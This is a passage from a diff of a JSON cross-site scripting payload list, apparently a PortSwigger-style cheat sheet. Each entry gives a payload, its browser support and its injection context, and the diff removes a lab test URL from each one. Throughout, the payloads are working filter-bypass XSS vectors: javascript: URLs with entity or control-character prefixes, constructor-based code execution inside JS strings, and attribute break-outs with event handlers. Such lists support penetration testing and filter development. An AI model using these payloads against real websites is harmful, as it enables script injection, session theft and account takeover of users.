     "description": "javascript: URL via &#x00000000000009; entity (inline, no ;) (attribute_href)",
     "code": "java&#x00000000000009script:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=java%26%23x00000000000009script%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#9; entity (inline, no ;) (attribute_href)",
     "code": "java&#9script:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=java%26%239script%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#00000000000009; entity (inline, no ;) (attribute_href)",
     "code": "java&#00000000000009script:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=java%26%2300000000000009script%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &NewLine; entity (prefix) (attribute_href)",
     "code": "&NewLine;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26NewLine%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &Tab; entity (prefix) (attribute_href)",
     "code": "&Tab;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26Tab%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via raw newline (prefix) (attribute_href)",
     "code": "\njavascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%0Ajavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via %09 tab prefix (attribute_href)",
     "code": "%09javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%2509javascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via space prefix (attribute_href)",
     "code": "%20javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%2520javascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#1; entity (prefix, with ;) (attribute_href)",
     "code": "&#1;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%231%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#2; entity (prefix, with ;) (attribute_href)",
     "code": "&#2;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%232%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#3; entity (prefix, with ;) (attribute_href)",
     "code": "&#3;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%233%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#4; entity (prefix, with ;) (attribute_href)",
     "code": "&#4;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%234%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#5; entity (prefix, with ;) (attribute_href)",
     "code": "&#5;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%235%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#6; entity (prefix, with ;) (attribute_href)",
     "code": "&#6;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%236%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#7; entity (prefix, with ;) (attribute_href)",
     "code": "&#7;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%237%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#8; entity (prefix, with ;) (attribute_href)",
     "code": "&#8;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%238%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#9; entity (prefix, with ;) (attribute_href)",
     "code": "&#9;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%239%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#10; entity (prefix, with ;) (attribute_href)",
     "code": "&#10;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2310%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#11; entity (prefix, with ;) (attribute_href)",
     "code": "&#11;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2311%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#12; entity (prefix, with ;) (attribute_href)",
     "code": "&#12;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2312%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#13; entity (prefix, with ;) (attribute_href)",
     "code": "&#13;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2313%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#14; entity (prefix, with ;) (attribute_href)",
     "code": "&#14;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2314%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#15; entity (prefix, with ;) (attribute_href)",
     "code": "&#15;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2315%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#16; entity (prefix, with ;) (attribute_href)",
     "code": "&#16;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2316%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#17; entity (prefix, with ;) (attribute_href)",
     "code": "&#17;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2317%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#18; entity (prefix, with ;) (attribute_href)",
     "code": "&#18;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2318%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#19; entity (prefix, with ;) (attribute_href)",
     "code": "&#19;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2319%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#20; entity (prefix, with ;) (attribute_href)",
     "code": "&#20;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2320%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#21; entity (prefix, with ;) (attribute_href)",
     "code": "&#21;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2321%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#22; entity (prefix, with ;) (attribute_href)",
     "code": "&#22;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2322%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#23; entity (prefix, with ;) (attribute_href)",
     "code": "&#23;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2323%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#24; entity (prefix, with ;) (attribute_href)",
     "code": "&#24;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2324%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#25; entity (prefix, with ;) (attribute_href)",
     "code": "&#25;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2325%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#26; entity (prefix, with ;) (attribute_href)",
     "code": "&#26;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2326%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#27; entity (prefix, with ;) (attribute_href)",
     "code": "&#27;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2327%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#28; entity (prefix, with ;) (attribute_href)",
     "code": "&#28;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2328%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#29; entity (prefix, with ;) (attribute_href)",
     "code": "&#29;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2329%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#30; entity (prefix, with ;) (attribute_href)",
     "code": "&#30;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2330%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#31; entity (prefix, with ;) (attribute_href)",
     "code": "&#31;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%2331%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x1; entity (prefix, with ;) (attribute_href)",
     "code": "&#x1;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x1%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x2; entity (prefix, with ;) (attribute_href)",
     "code": "&#x2;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x2%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x3; entity (prefix, with ;) (attribute_href)",
     "code": "&#x3;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x3%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x4; entity (prefix, with ;) (attribute_href)",
     "code": "&#x4;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x4%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x5; entity (prefix, with ;) (attribute_href)",
     "code": "&#x5;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x5%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x6; entity (prefix, with ;) (attribute_href)",
     "code": "&#x6;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x6%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x7; entity (prefix, with ;) (attribute_href)",
     "code": "&#x7;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x7%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x8; entity (prefix, with ;) (attribute_href)",
     "code": "&#x8;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x8%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x9; entity (prefix, with ;) (attribute_href)",
     "code": "&#x9;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x9%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#xa; entity (prefix, with ;) (attribute_href)",
     "code": "&#xa;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23xa%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#xb; entity (prefix, with ;) (attribute_href)",
     "code": "&#xb;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23xb%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#xc; entity (prefix, with ;) (attribute_href)",
     "code": "&#xc;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23xc%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#xd; entity (prefix, with ;) (attribute_href)",
     "code": "&#xd;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23xd%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#xe; entity (prefix, with ;) (attribute_href)",
     "code": "&#xe;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23xe%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#xf; entity (prefix, with ;) (attribute_href)",
     "code": "&#xf;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23xf%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x10; entity (prefix, with ;) (attribute_href)",
     "code": "&#x10;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x10%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x11; entity (prefix, with ;) (attribute_href)",
     "code": "&#x11;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x11%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x12; entity (prefix, with ;) (attribute_href)",
     "code": "&#x12;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x12%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x13; entity (prefix, with ;) (attribute_href)",
     "code": "&#x13;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x13%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x14; entity (prefix, with ;) (attribute_href)",
     "code": "&#x14;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x14%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x15; entity (prefix, with ;) (attribute_href)",
     "code": "&#x15;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x15%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x16; entity (prefix, with ;) (attribute_href)",
     "code": "&#x16;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x16%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x17; entity (prefix, with ;) (attribute_href)",
     "code": "&#x17;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x17%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x18; entity (prefix, with ;) (attribute_href)",
     "code": "&#x18;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x18%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x19; entity (prefix, with ;) (attribute_href)",
     "code": "&#x19;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x19%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x1a; entity (prefix, with ;) (attribute_href)",
     "code": "&#x1a;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x1a%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x1b; entity (prefix, with ;) (attribute_href)",
     "code": "&#x1b;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x1b%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x1c; entity (prefix, with ;) (attribute_href)",
     "code": "&#x1c;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x1c%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x1d; entity (prefix, with ;) (attribute_href)",
     "code": "&#x1d;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x1d%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x1e; entity (prefix, with ;) (attribute_href)",
     "code": "&#x1e;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x1e%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "javascript: URL via &#x1f; entity (prefix, with ;) (attribute_href)",
     "code": "&#x1f;javascript:alert(1)",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%26%23x1f%3Bjavascript%3Aalert%281%29",
     "context": "attribute_href"
   },
   {
     "description": "atob.constructor() (js_string_single)",
     "code": "'-atob.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-atob.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "btob.constructor() (js_string_single)",
     "code": "'-btob.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-btob.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "Ink.constructor() (js_string_single)",
     "code": "'-Ink.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-Ink.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "HID.constructor() (js_string_single)",
     "code": "'-HID.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-HID.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "GPU.constructor() (js_string_single)",
     "code": "'-GPU.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-GPU.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "when.constructor() (js_string_single)",
     "code": "'-when.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-when.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "find.constructor() (js_string_single)",
     "code": "'-find.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-find.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "print.constructor() (js_string_single)",
     "code": "'-print.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-print.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "Set.constructor() (js_string_single)",
     "code": "'-Set.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-Set.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "{}.constructor.constructor() (js_string_single)",
     "code": "'-{}.constructor.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-%7B%7D.constructor.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "''.constructor.constructor() (js_string_single)",
     "code": "'-''.constructor.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-%27%27.constructor.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "[].constructor.constructor() (js_string_single)",
     "code": "'-[].constructor.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-%5B%5D.constructor.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "0..constructor.constructor() (js_string_single)",
     "code": "'-0..constructor.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-0..constructor.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "0n.constructor.constructor() (js_string_single)",
     "code": "'-0n.constructor.constructor('a'+'lert(1)')()-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-0n.constructor.constructor%28%27a%27%2B%27lert%281%29%27%29%28%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "createElement('script')+append (js_string_single)",
     "code": "'-[s=document.createElement('script'),s.append('a'+'lert(1)'),document.documentElement.append(s)]-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-%5Bs%3Ddocument.createElement%28%27script%27%29%2Cs.append%28%27a%27%2B%27lert%281%29%27%29%2Cdocument.documentElement.append%28s%29%5D-%27",
     "context": "js_string_single"
   },
   {
     "description": "location.replace(javascript:) (js_string_single)",
     "code": "'-location.replace('javascript:a\\lert(1)')-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-location.replace%28%27javascript%3Aa%5Clert%281%29%27%29-%27",
     "context": "js_string_single"
   },
   {
     "description": "location='javascript:a\\lert(1)' (js_string_single)",
     "code": "'-[location='javascript:a\\lert(1)']-'",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%27-%5Blocation%3D%27javascript%3Aa%5Clert%281%29%27%5D-%27",
     "context": "js_string_single"
   },
   {
     "description": "attribute break-out with onfocus (slash-sep) +tabindex +autofocus (attribute_double)",
     "code": "\"/onfocus=alert(1) tabindex=1 autofocus/",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonfocus%3Dalert%281%29%20tabindex%3D1%20autofocus%2F&context=attribute_double",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onfocusin (slash-sep) +tabindex +autofocus (attribute_double)",
     "code": "\"/onfocusin=alert(1) tabindex=1 autofocus/",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonfocusin%3Dalert%281%29%20tabindex%3D1%20autofocus%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onmousemove (slash-sep) (attribute_double)",
     "code": "\"/onmousemove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonmousemove%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onmouseenter (slash-sep) (attribute_double)",
     "code": "\"/onmouseenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonmouseenter%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onpointerenter (slash-sep) (attribute_double)",
     "code": "\"/onpointerenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /",
     "browsers": ["chrome", "firefox", "edge", "safari"],
-    "url": "https://portswigger-labs.net/xss/xss.php?x=%22%2Fonpointerenter%3Dalert%281%29%20style%3Dposition%3Afixed%3Bwidth%3A100vw%3Bheight%3A100vh%3Bz-index%3A100000%3Bleft%3A0%3Btop%3A0%20%2F",
     "context": "attribute_double"
   },
   {
     "description": "attribute break-out with onpointermove (slash-sep) (attribute_double)",
